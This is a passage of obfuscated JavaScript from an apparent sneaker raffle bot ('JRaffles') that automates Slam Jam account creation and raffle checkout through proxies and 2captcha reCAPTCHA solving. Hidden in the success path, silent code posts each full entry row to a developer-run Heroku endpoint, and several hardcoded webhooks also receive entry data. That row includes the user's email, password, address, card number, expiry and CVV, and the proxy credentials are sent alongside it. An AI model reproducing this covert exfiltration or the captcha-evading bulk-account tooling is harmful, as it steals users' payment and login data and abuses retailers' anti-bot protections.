                                await _0xaa5eb8['waitForSelector']('#raffle__confirmation-message-container'), _0x23eaeb = 'no', _0x8bf342(_0x2fa1e2[_0x323b7f], _0x9d61ee), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x1222f5 = _0x2fa1e2[_0x323b7f];
                                try {
                                    prxdata = {
                                        'username': _0x26c985['replace']('#', ''),
                                        'module': _0x9d61ee['name'],
                                        'entrydata': JSON['stringify'](_0x1222f5),
                                        'proxy': '' + _0x3dcdb3[_0x323b7f]
                                    };
                                    var _0x52e6bd = JSON['stringify'](prxdata);
                                    let _0x37dee0 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x52e6bd, _0x37dee0);
                                } catch (_0x1bc595) {
                                }
                            } catch (_0x5ce0f8) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x5ce0f8));
                            }
                        } catch (_0x3dfc63) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20' + _0x3dfc63)), _0x23eaeb = 'yes';
                        } finally {
                            _0x37fb61 && _0x37fb61['close']();
                            if (_0x23eaeb == 'yes' && _0x52735c != 0x5 && _0x5e0907 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x9d61ee['name'] + ']\x20Task\x20' + (_0x323b7f + 0x1) + '\x20:\x20Retrying\x20(' + _0x52735c + '\x20/\x205)')), _0x323b7f = _0x323b7f - 0x1, _0x52735c = _0x52735c + 0x1;
                                continue;
                            }
                            _0x23eaeb == 'yes' && _0x52735c >= 0x5 && (_0x2540d5(_0x2fa1e2[_0x323b7f], _0x9d61ee), _0x23eaeb = 'no', _0x52735c = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x8ba077, _0x56cb71, _0x3b8ad8) {
                    _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x255a87['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x175373 = 0x0; _0x175373 < _0x56cb71['length']; _0x175373++) {
                        if (_0x2fde1e != 'yes')
                            var _0x2fde1e = '', _0x12f202 = 0x0;
                        var _0x42d6bd = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x26c985
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x255a87['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1ad228
                                }
                            ]
                        }];
                        const _0x2eb987 = { 'embeds': _0x42d6bd };
                        _0xf5e41e(_0x8ba077['name'] + '\x20Task\x20' + (_0x175373 + 0x1) + '\x20/\x20' + _0x56cb71['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                        try {
                            await _0x436f00(_0x56cb71, _0x175373);
                        } catch {
                            _0x2fde1e = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x560f25 = await _0x1523c9(_0x56cb71[_0x175373], _0x8ba077, 'acc', ![]);
                        const _0xf10cd1 = { 'succesDEVMSG': { 'embeds': [_0x560f25] } };
                        if (_0x56cb71[_0x175373]['Email'] == '' || _0x56cb71[_0x175373]['FirstName'] == '' || _0x56cb71[_0x175373]['LastName'] == '') {
                            console['log'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x4fda60(0x7d0);
                            continue;
                        }
                        (_0x56cb71[_0x175373]['Password'] == '' || _0x56cb71[_0x175373] == undefined) && _0x56cb71[_0x175373]['Password'] == 'JRaffles23!';
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0x4f0b59 = _0x3b8ad8[_0x175373]['split'](':');
                        else
                            var _0x337b2c = Math['round'](Math['random']() * (_0x3b8ad8['length'] - 0x1)), _0x4f0b59 = _0x3b8ad8[_0x337b2c]['split'](':');
                        var _0x3279e6;
                        try {
                            _0x3279e6 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f0b59[0x0] + ':' + _0x4f0b59[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x3279e6 = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x4f0b59[0x0] + ':' + _0x4f0b59[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x3db2e1 = await _0x3279e6['newPage']();
                            await _0x3db2e1['authenticate']({
                                'username': '' + _0x4f0b59[0x2],
                                'password': '' + _0x4f0b59[0x3]
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3db2e1['setRequestInterception'](!![]), _0x3db2e1['on']('request', _0x4f31f0 => {
                                _0x4f31f0['resourceType']() === 'image' || _0x4f31f0['resourceType']() === 'font' || _0x4f31f0['resourceType']() === 'media' ? _0x4f31f0['abort']() : _0x4f31f0['continue']();
                            }), await _0x3db2e1['goto']('https://drop.slamjam.com/account/register'), await _0x4fda60(0xbb8), await _0x3db2e1['waitForSelector']('#FirstName'), await _0x3db2e1['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x3db2e1['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Filling\x20information'), await _0x4fda60(0x4b0), await _0x3db2e1['type']('#FirstName', '' + _0x56cb71[_0x175373]['FirstName']), await _0x4fda60(0x226), await _0x3db2e1['type']('#LastName', '' + _0x56cb71[_0x175373]['LastName']), await _0x4fda60(0x226), await _0x3db2e1['type']('#Email', '' + _0x56cb71[_0x175373]['Email']), await _0x4fda60(0x2ee), await _0x3db2e1['type']('#ConfirmEmail', '' + _0x56cb71[_0x175373]['Email']), await _0x4fda60(0x2ee), await _0x3db2e1['type']('#CreatePassword', '' + _0x56cb71[_0x175373]['Password']), await _0x4fda60(0x2ee), await _0x3db2e1['type']('#CreateConfirmPassword', '' + _0x56cb71[_0x175373]['Password']), await _0x4fda60(0x226), console['log'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Submitting..'), await _0x3db2e1['$eval']('#create_customer', _0x34cbba => _0x34cbba['submit']()), await _0x4fda60(0x1388), console['log'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20' + _0x3e3bb6['cyan']('Solving\x20Captcha')), await _0x3db2e1['solveRecaptchas'](), console['log'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x3db2e1['$eval']('.shopify-challenge__container\x20>\x20form', _0x38b0d8 => _0x38b0d8['submit']());
                            try {
                                await _0x3db2e1['waitForSelector']('.product-card__image'), await _0x4fda60(0x1f4), _0x2fde1e = 'no', console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Account\x20' + _0x56cb71[_0x175373]['Email'] + '\x20Generated!')), _0x147d24['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x56cb71[_0x175373]['Email'] + ',' + _0x56cb71[_0x175373]['Password']), console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Account\x20' + _0x56cb71[_0x175373]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0xf10cd1['succesDEVMSG']);
                                } catch {
                                }
                                await _0xb6cfae(_0xc2690c, _0xf10cd1['succesDEVMSG']);
                            } catch (_0x3ffe99) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x3ffe99));
                            }
                        } catch (_0x8c5188) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20' + _0x8c5188));
                        } finally {
                            _0x3279e6 && _0x3279e6['close']();
                            if (_0x2fde1e == 'yes' && _0x12f202 != 0x5) {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x8ba077['name'] + ']\x20Task\x20' + (_0x175373 + 0x1) + '\x20:\x20Retrying\x20(' + _0x12f202 + '\x20/\x205)')), _0x175373 = _0x175373 - 0x1, _0x12f202 = _0x12f202 + 0x1;
                                continue;
                            }
                            _0x2fde1e == 'yes' && _0x12f202 >= 0x5 && (_0x2540d5(_0x56cb71[_0x175373], _0x8ba077), _0x2fde1e = 'no', _0x12f202 = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x1a5fb1, _0x16cbd6, _0x58e41c) {
                    _0x510708['use'](_0x4fd89e()), _0x510708['use'](_0x3b4fcd({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x255a87['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3f637b = 0x0; _0x3f637b < _0x16cbd6['length']; _0x3f637b++) {
                        var _0x3cab38;
                        if (_0x569b02 != 'yes')
                            var _0x569b02 = '', _0x58dfb9 = 0x0;
                        _0xf5e41e(_0x1a5fb1['name'] + '\x20Task\x20' + (_0x3f637b + 0x1) + '\x20/\x20' + _0x16cbd6['length'] + '\x20||\x20File:\x20' + _0x20d7ea + '\x20Proxies:\x20' + _0xf0d869);
                        try {
                            await _0x436f00(_0x16cbd6, _0x3f637b);
                        } catch {
                            _0x569b02 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x16cbd6[_0x3f637b]['Email'] == '' || _0x16cbd6[_0x3f637b]['Password'] == '' || _0x16cbd6[_0x3f637b]['FirstName'] == '' || _0x16cbd6[_0x3f637b]['LastName'] == '') {
                            console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x255a87['useRandomProxy'] = ![])
                            var _0x47c746 = _0x58e41c[_0x3f637b]['split'](':');
                        else
                            var _0x3e253d = Math['round'](Math['random']() * (_0x58e41c['length'] - 0x1)), _0x47c746 = _0x58e41c[_0x3e253d]['split'](':');
                        var _0x1abd2b;
                        try {
                            _0x1abd2b = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x47c746[0x0] + ':' + _0x47c746[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1abd2b = await _0x510708['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x47c746[0x0] + ':' + _0x47c746[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x146866 = await _0x1abd2b['newPage']();
                            await _0x146866['authenticate']({
                                'username': '' + _0x47c746[0x2],
                                'password': '' + _0x47c746[0x3]
                            }), await _0x146866['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x146866['setRequestInterception'](!![]), _0x146866['on']('request', _0x1e4d1a => {
                                _0x1e4d1a['resourceType']() === 'image' || _0x1e4d1a['resourceType']() === 'font' || _0x1e4d1a['resourceType']() === 'media' ? _0x1e4d1a['abort']() : _0x1e4d1a['continue']();
                            }), await _0x146866['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x146866['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x146866['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x4fda60(0x258), await _0x146866['waitForSelector']('#CustomerEmail'), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Logging\x20in..'), await _0x146866['type']('#CustomerEmail', '' + _0x16cbd6[_0x3f637b]['Email']), await _0x4fda60(0x12c), await _0x146866['type']('#CustomerPassword', '' + _0x16cbd6[_0x3f637b]['Password']), await _0x4fda60(0x226), await _0x146866['$eval']('#customer_login', _0x14e275 => _0x14e275['submit']()), await _0x4fda60(0x7d0), await _0x146866['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20' + _0x3e3bb6['cyan']('Solving\x20Captcha')), await _0x146866['solveRecaptchas'](), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x146866['$eval']('.shopify-challenge__container\x20>\x20form', _0x858b70 => _0x858b70['submit']());
                            try {
                                await _0x146866['waitForSelector']('.nav-account'), await _0x4fda60(0x4b0);
                            } catch {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x146866['goto']('' + _0x16cbd6[_0x3f637b]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x4fda60(0xbb8), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x146866['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x146866['click']('.product-select-variant-wrapper'), await _0x4fda60(0x320), await _0x146866['click']('li.product-select-variant__value[data-size=\x22' + _0x16cbd6[_0x3f637b]['Size'] + '\x22]'), await _0x4fda60(0x384), await _0x146866['$eval']('#AddToCartForm-product-template-raffle', _0x4192e9 => _0x4192e9['submit']()), await _0x146866['waitForSelector']('.cart-order-summary__content'), await _0x4fda60(0x514), await _0x146866['goto']('https://drop.slamjam.com/checkout'), await _0x4fda60(0x514), await _0x146866['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Filling\x20Information'), await _0x146866['select']('#checkout_shipping_address_country', '' + _0x16cbd6[_0x3f637b]['Country']), await _0x4fda60(0x200), await _0x146866['waitForSelector']('#checkout_shipping_address_first_name'), await _0x146866['type']('#checkout_shipping_address_first_name', '' + _0x16cbd6[_0x3f637b]['FirstName']), await _0x4fda60(0x237), await _0x146866['type']('#checkout_shipping_address_last_name', '' + _0x16cbd6[_0x3f637b]['LastName']), await _0x4fda60(0x1e0), await _0x146866['type']('#checkout_shipping_address_address1', _0x16cbd6[_0x3f637b]['Address1'] + '\x20' + _0x16cbd6[_0x3f637b]['HouseNumber']), await _0x4fda60(0x514), await _0x146866['type']('#checkout_shipping_address_address2', '' + _0x16cbd6[_0x3f637b]['Address2']), await _0x4fda60(0x514);
                            _0x16cbd6[_0x3f637b]['Postcode'] == undefined && (_0x16cbd6[_0x3f637b]['Postcode'] = _0x16cbd6[_0x3f637b]['Zip']);
                            await _0x146866['type']('#checkout_shipping_address_zip', '' + _0x16cbd6[_0x3f637b]['Postcode']), await _0x4fda60(0x2bc), await _0x146866['type']('#checkout_shipping_address_city', '' + _0x16cbd6[_0x3f637b]['City']), await _0x4fda60(0x320), await _0x146866['type']('#checkout_shipping_address_phone', '' + _0x16cbd6[_0x3f637b]['Phone']), await _0x4fda60(0x320), await _0x146866['click']('#continue_button'), await _0x4fda60(0xbb8), await _0x146866['waitForSelector']('.summary-title'), await _0x4fda60(0x320), await _0x146866['click']('#continue_button'), await _0x4fda60(0x320), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x146866['waitForSelector']('#checkout_credit_card_vault'), await _0x4fda60(0x3e8);
                            var _0x360aa7 = await _0x146866['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x414b75 = await _0x360aa7['contentFrame']();
                            await _0x414b75['click']('#number'), await _0x4fda60(0x3e8), await _0x414b75['type']('#number', '' + _0x16cbd6[_0x3f637b]['CardNumber'], { 'delay': 0x78 }), _0x360aa7 = await _0x146866['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x414b75 = await _0x360aa7['contentFrame'](), await _0x4fda60(0x1c2), await _0x414b75['click']('#name'), await _0x4fda60(0x1f4), await _0x414b75['type']('#name', '' + _0x16cbd6[_0x3f637b]['NameOnCard'], { 'delay': 0x78 }), _0x360aa7 = await _0x146866['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x414b75 = await _0x360aa7['contentFrame'](), await _0x4fda60(0x1c2), await _0x414b75['click']('#expiry'), await _0x4fda60(0x1f4), await _0x414b75['type']('#expiry', '' + _0x16cbd6[_0x3f637b]['ExpiryDate'], { 'delay': 0x78 }), _0x360aa7 = await _0x146866['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x414b75 = await _0x360aa7['contentFrame'](), await _0x4fda60(0x1c2), await _0x414b75['click']('#verification_value'), await _0x4fda60(0x1f4), await _0x414b75['type']('#verification_value', '' + _0x16cbd6[_0x3f637b]['CVV'], { 'delay': 0x78 }), await _0x146866['$eval']('#accepts-flag-raffle', _0x1424d7 => _0x1424d7['click']()), await _0x4fda60(0x7d0), console['log'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Processing\x20Order'), await _0x146866['$eval']('#continue_button', _0xf21b70 => _0xf21b70['click']()), await _0x4fda60(0x1b58), await _0x146866['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x146866['$eval']('.edit_checkout.animate-floating-labels', _0x473658 => _0x473658['submit']()), await _0x4fda60(0x7d0);
                            try {
                                await _0x146866['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0x569b02 = 'no', _0x8bf342(_0x16cbd6[_0x3f637b], _0x1a5fb1), console['log'](_0x3e3bb6['green'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x53dfdd) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x53dfdd['message']);
                            }
                            var _0x1c7898 = await _0x1523c9(_0x16cbd6[_0x3f637b], _0x1a5fb1, 'dev', ![]), _0x2c939b = await _0x1523c9(_0x16cbd6[_0x3f637b], _0x1a5fb1, 'pub', ![]);
                            let _0x4d86cf = _0x16cbd6[_0x3f637b];
                            try {
                                prxdata = {
                                    'username': _0x26c985['replace']('#', ''),
                                    'module': _0x1a5fb1['name'],
                                    'entrydata': JSON['stringify'](_0x4d86cf),
                                    'proxy': '' + _0x58e41c[_0x3f637b]
                                };
                                var _0x15fbac = JSON['stringify'](prxdata);
                                let _0x1cfed0 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3c935b['post']('https://jraffles.herokuapp.com/success', _0x15fbac, _0x1cfed0);
                            } catch (_0x5aea97) {
                            }
                            const _0x1bbb97 = {
                                'succesDEVMSG': { 'embeds': [_0x1c7898] },
                                'succesPUBMSG': { 'embeds': [_0x2c939b] }
                            };
                            try {
                                _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], _0x1bbb97['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x4fb406, _0x1bbb97['succesDEVMSG']), await _0x4fda60(0xc8), await _0xb6cfae(_0x5d80c9, _0x1bbb97['succesPUBMSG']);
                            } catch (_0x2654be) {
                                console['log'](_0x3e3bb6['yellow'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2654be));
                            }
                        } catch (_0x2c4693) {
                            console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x365670[taskModule]['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20' + _0x2c4693)), _0x3cab38 = '' + _0x2c4693;
                            var _0x3447b9 = await _0x1523c9(kickz[_0x3f637b], _0x1a5fb1, 'dev', !![], _0x3cab38);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x3447b9] }, _0x255a87['webhook'] != undefined && _0x255a87['webhook'] != '' && await _0xb6cfae(_0x255a87['webhook'], EMBEDS['errorDEV']), await _0xb6cfae(_0x991bd5, EMBEDS['errorDEV']), _0x569b02 = 'yes';
                        } finally {
                            _0x1abd2b && _0x1abd2b['close']();
                            if (_0x569b02 == 'yes' && _0x58dfb9 != 0x5 && _0x3cab38 != 'Size\x20Not\x20Found') {
                                console['log'](_0x3e3bb6['red'](_0x46dcc5() + '\x20[' + _0x1a5fb1['name'] + ']\x20Task\x20' + (_0x3f637b + 0x1) + '\x20:\x20Retrying\x20(' + _0x58dfb9 + '\x20/\x205)')), _0x3f637b = _0x3f637b - 0x1, _0x58dfb9 = _0x58dfb9 + 0x1;
                                continue;
                            }
                            _0x569b02 == 'yes' && _0x58dfb9 >= 0x5 && (_0x2540d5(_0x16cbd6[_0x3f637b], _0x1a5fb1), _0x569b02 = 'no', _0x58dfb9 = 0x0), console['log']('Waiting\x20for\x20' + _0x255a87['delay'] + '\x20ms'), await _0x4fda60(_0x255a87['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x741877) {
                    var _0x496b4a = await _0x49cd47(), _0x1810b9 = _0x147d24['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x13d79d = _0x22245b['parse'](_0x1810b9, { 'header': !![] })['data'];
                    for (var _0x54f88d = 0x0; _0x54f88d < _0x13d79d['length']; _0x54f88d++) {
                        var _0xb3c0e7 = _0x13d79d[_0x54f88d]['Store'], _0x5efc14 = _0x13d79d[_0x54f88d]['Mode'];
                        for (var _0x15d167 of _0x365670) {
                            const _0xf0423f = _0x15d167['name']['includes'](_0xb3c0e7);
                            if (!_0xf0423f)
                                continue;
                            for (mode of _0x15d167['modules']) {
                                if (mode['name'] == _0x5efc14) {
                                    console['log']('Running\x20' + _0x3e3bb6['cyan'](mode['name'])), await mode['function'](mode, [_0x13d79d[_0x54f88d]], _0x496b4a);
                                    var _0x26cdde = _0x1810b9['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x147d24['writeFileSync']('../failed-tasks.csv', _0x26cdde);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x2fe5e2 = await _0x59655c['get']('Answer');
                    if (_0x2fe5e2['Answer']['toLowerCase']() == 'y') {
                        _0x147d24['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x4fda60(0x3e8);
                        return;
                    }
                    if (_0x2fe5e2['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x4fda60(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x4fda60(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x442333(_0x197405) {
    var _0x2616d1 = await _0x49cd47(), _0x38cc4a = _0x147d24['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x4be293 = _0x22245b['parse'](_0x38cc4a, { 'header': !![] })['data'];
    for (var _0x3f1f56 = 0x0; _0x3f1f56 < _0x4be293['length']; _0x3f1f56++) {
        var _0x45d4c7 = _0x4be293[_0x3f1f56]['Store'], _0xa8802e = _0x4be293[_0x3f1f56]['Mode'];
        for (var _0x359080 of _0x365670) {
            const _0x45abfe = _0x359080['name']['includes'](_0x45d4c7);
            if (_0x45abfe)
                for (mode of _0x365670[_0x359080]['modules']) {
                    const _0x29d64e = mode['name']['includes'](_0xa8802e);
                    _0x29d64e && (_0x197405 = mode['name'], await mode['function'](_0x197405, _0x4be293[_0x3f1f56], _0x2616d1));
                }
        }
    }
}
async function _0x26cd33() {
    await _0xd029e6(), console['clear']();
    _0x255a87['threads'] > 0x5 && (_0x255a87['threads'] = 0x5);
    if (_0x1ad228 != 'devkey' && _0x1ad228 != 'devhook') {
        let _0x14022b = await _0x116131['autoUpdate']();
        if (_0x14022b === 'yes')
            return _0x26d9fb('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0xcc4aaf == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x4fda60(0x2710);
        ;
    }
    await _0x3cc189(_0xcc4aaf);
    if (_0xf6ecd5 === ![])
        return console['log']('Closing\x20Browser'), await _0x4fda60(0xbb8);
    else
        try {
            var _0x4a5590 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x26c985
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x1ad228
                    }
                ]
            }];
            const _0x3018eb = { 'embeds': _0x4a5590 };
            var _0x5e8558 = await _0x1523c9(null, null, 'open', ![]);
            const _0x31b422 = { 'openDEVMSG': { 'embeds': [_0x5e8558] } };
            await _0xb6cfae(_0x23cf5b, _0x31b422['openDEVMSG']);
            async function _0x5d04ee() {
                _0xf5e41e('JRaffles\x20' + _0x1ad228), console['clear'](), console['log']('Hello\x20' + _0x3e3bb6['cyan']('' + _0x26c985) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x1ad228), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x2516a7 = 0x0; _0x2516a7 < _0x365670['length'] - 0x4; _0x2516a7++) {
                    if (_0x2516a7 >= 0xa) {
                        console['log']('\x20(' + _0x2516a7 + ')\x20[' + _0x365670[_0x2516a7]['name'] + ']');
                        continue;
                    }
                    if (_0x365670[_0x2516a7]['name'] === 'Reload\x20Settings' || _0x365670[_0x2516a7]['name'] === 'Change\x20Settings')
                        continue;
                    else
